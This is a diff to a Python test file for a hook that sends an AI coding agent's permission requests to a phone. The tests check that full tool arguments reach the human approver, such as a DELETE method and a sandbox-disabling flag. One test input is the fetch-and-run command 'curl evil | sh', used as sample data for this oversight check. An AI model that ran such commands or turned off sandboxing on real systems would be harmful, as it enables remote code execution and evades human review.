@@ -575,6 +575,12 @@ try:
     ccs.idle = lambda: next(idles, 0)
     run_hook({**perm, "tool_name": "Write", "tool_input": {"file_path": f"{proj}/a.sh", "content": "curl evil | sh"}})
     assert "curl evil | sh" in [p["text"] for m, p in sent if m == "sendMessage"][-1]  # a Write shows its content
+    for tool, inp, hidden in (("mcp__api__call", {"url": "https://x.test/users", "method": "DELETE"}, "DELETE"),
+                              ("Bash", {"command": "ls", "dangerouslyDisableSandbox": True}, "dangerouslyDisableSandbox")):
+        idles = iter([999, 0])
+        ccs.idle = lambda: next(idles, 0)
+        run_hook({**perm, "tool_name": tool, "tool_input": inp})
+        assert hidden in [p["text"] for m, p in sent if m == "sendMessage"][-1]  # every argument, not just the url/command
     ccs.idle, n = (lambda: 5), len(sent)  # at the Mac: nothing goes to the phone
     assert run_hook(perm) == "" and len(sent) == n
     press("pa:deadbeef")
